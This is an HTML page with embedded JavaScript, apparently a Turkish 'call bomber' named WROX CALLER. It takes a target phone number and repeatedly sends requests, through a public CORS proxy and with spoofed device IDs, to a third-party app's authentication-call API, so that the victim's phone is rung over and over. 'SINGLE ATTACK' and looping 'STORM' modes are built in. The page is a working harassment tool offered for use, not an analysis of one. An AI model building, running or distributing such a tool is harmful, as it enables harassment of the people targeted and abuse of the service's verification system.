<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WROX CALLER | LIVE MONITOR</title>
    <style>
        :root { --wrox-cyan: #00f2ff; --wrox-bg: #050505; --wrox-red: #ff003c; --wrox-green: #00ff88; --wrox-dark: #0a0a0a; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
        
        body { 
            background: var(--wrox-bg); 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            padding: 20px;
        }

        .main-frame {
            width: 100%;
            max-width: 900px;
            display: grid;
            grid-template-columns: 1.5fr 1fr;
            gap: 20px;
        }

        /* SOL PANEL: KONTROL */
        .control-panel {
            background: #000;
            border: 2px solid var(--wrox-cyan);
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
        }

        /* SAĞ PANEL: MONITOR */
        .monitor-panel {
            background: #000;
            border: 2px solid var(--wrox-green);
            padding: 20px;
            border-radius: 5px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .ascii-header {
            color: var(--wrox-cyan);
            font-size: 7px;
            white-space: pre;
            text-align: center;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: var(--wrox-dark);
            border: 1px solid #222;
            color: var(--wrox-green);
            margin-bottom: 15px;
            outline: none;
        }

        .btn-group { display: flex; gap: 10px; }
        button {
            flex: 1;
            padding: 12px;
            background: transparent;
            border: 1px solid var(--wrox-cyan);
            color: var(--wrox-cyan);
            cursor: pointer;
            font-weight: bold;
            font-size: 11px;
        }
        button:hover { background: var(--wrox-cyan); color: #000; }

        /* MONITOR ELEMENTLERİ */
        .status-box {
            background: #080808;
            padding: 10px;
            border-left: 3px solid var(--wrox-green);
        }
        .status-label { font-size: 10px; color: #555; text-transform: uppercase; }
        .status-value { font-size: 14px; color: var(--wrox-green); margin-top: 5px; }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #111;
            margin-top: 5px;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: var(--wrox-green);
            width: 0%;
            transition: 0.3s;
        }

        #live-logs {
            flex: 1;
            background: #030303;
            border: 1px solid #111;
            padding: 10px;
            font-size: 10px;
            color: #444;
            overflow-y: auto;
            max-height: 150px;
        }

        .active-pulse {
            width: 10px;
            height: 10px;
            background: var(--wrox-green);
            border-radius: 50%;
            display: inline-block;
            margin-right: 10px;
            box-shadow: 0 0 10px var(--wrox-green);
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        @media (max-width: 768px) {
            .main-frame { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<div class="main-frame">
    <div class="control-panel">
        <div class="ascii-header">
 ██╗    ██╗██████╗  ██████╗ ██╗  ██╗
 ██║    ██║██╔══██╗██╔═══██╗╚██╗██╔╝
 ██║ █╗ ██║██████╔╝██║   ██║ ╚███╔╝ 
 ██║███╗██║██╔══██╗██║   ██║ ██╔██╗ 
 ╚███╔███╔╝██║  ██║╚██████╔╝██╔╝ ██╗</div>

        <h3 style="text-align:center; color:white; letter-spacing:3px; margin-bottom:20px;">WROX TERMINAL</h3>
        
        <label style="font-size:10px; color:var(--wrox-cyan);">TARGET PHONE (+90)</label>
        <input type="text" id="phone" placeholder="+905XXXXXXXXX">
        
        <div class="btn-group">
            <button onclick="run('single')">SINGLE ATTACK</button>
            <button onclick="run('loop')" id="loop-btn">STORM LOOP</button>
        </div>

        <div id="live-logs">System ready for deployment...</div>
    </div>

    <div class="monitor-panel">
        <h4 style="color:var(--wrox-green); font-size:12px; border-bottom:1px solid #111; padding-bottom:5px;">● LIVE COMMAND MONITOR</h4>
        
        <div class="status-box">
            <div class="status-label">Operation Status</div>
            <div class="status-value" id="op-status">IDLE</div>
        </div>

        <div class="status-box" style="border-left-color: var(--wrox-cyan);">
            <div class="status-label">Target Signal Strength</div>
            <div class="status-value" id="signal-val">0%</div>
            <div class="progress-bar"><div id="signal-bar" class="progress-fill" style="background:var(--wrox-cyan)"></div></div>
        </div>

        <div class="status-box" style="border-left-color: orange;">
            <div class="status-label">Cooldown / Next Wave</div>
            <div class="status-value" id="timer-val">STANDBY</div>
            <div class="progress-bar"><div id="timer-bar" class="progress-fill" style="background:orange"></div></div>
        </div>

        <div class="status-box" style="border-left-color: var(--wrox-red);">
            <div class="status-label">Total Packets Sent</div>
            <div class="status-value" id="packet-count">0</div>
        </div>
    </div>
</div>

<script>
    let packets = 0;
    let isLooping = false;
    let timerInt = null;

    function addLog(m, type='') {
        const logBox = document.getElementById('live-logs');
        const time = new Date().toLocaleTimeString();
        logBox.innerHTML = `<div>[${time}] ${m}</div>` + logBox.innerHTML;
    }

    async function execute() {
        const num = document.getElementById('phone').value;
        if(num.length < 10) return;

        // Visual Feedback
        document.getElementById('op-status').innerHTML = '<span class="active-pulse"></span>ATTACKING...';
        document.getElementById('signal-val').innerText = Math.floor(Math.random() * 40 + 60) + "%";
        document.getElementById('signal-bar').style.width = document.getElementById('signal-val').innerText;

        // Python'daki API isteği (Proxy ile)
        const api = "https://api.telz.com/app/auth_call";
        const proxy = `https://api.allorigins.win/get?url=${encodeURIComponent(api)}&phone=${num}&android_id=WROX_${Math.random().toString(36).substr(2,6).toUpperCase()}`;

        try {
            await fetch(proxy);
            packets++;
            document.getElementById('packet-count').innerText = packets;
            addLog(`Request sent to ${num}`, 'success');
            startCooldown();
        } catch(e) {
            addLog("Signal lost. Retrying...", "error");
        }
    }

    function startCooldown() {
        let s = 60;
        document.getElementById('op-status').innerText = "COOLDOWN";
        timerInt = setInterval(() => {
            s--;
            document.getElementById('timer-val').innerText = s + "s";
            document.getElementById('timer-bar').style.width = (s / 60 * 100) + "%";
            if(s <= 0) {
                clearInterval(timerInt);
                document.getElementById('op-status').innerText = isLooping ? "RE-ARMING" : "READY";
                document.getElementById('timer-val').innerText = "READY";
            }
        }, 1000);
    }

    function run(mode) {
        if(mode === 'single') {
            execute();
        } else {
            if(isLooping) {
                isLooping = false;
                location.reload(); // Stop all
            } else {
                isLooping = true;
                document.getElementById('loop-btn').innerText = "TERMINATE STORM";
                document.getElementById('loop-btn').style.borderColor = "red";
                execute();
                setInterval(execute, 62000);
            }
        }
    }
</script>

</body>
</html>
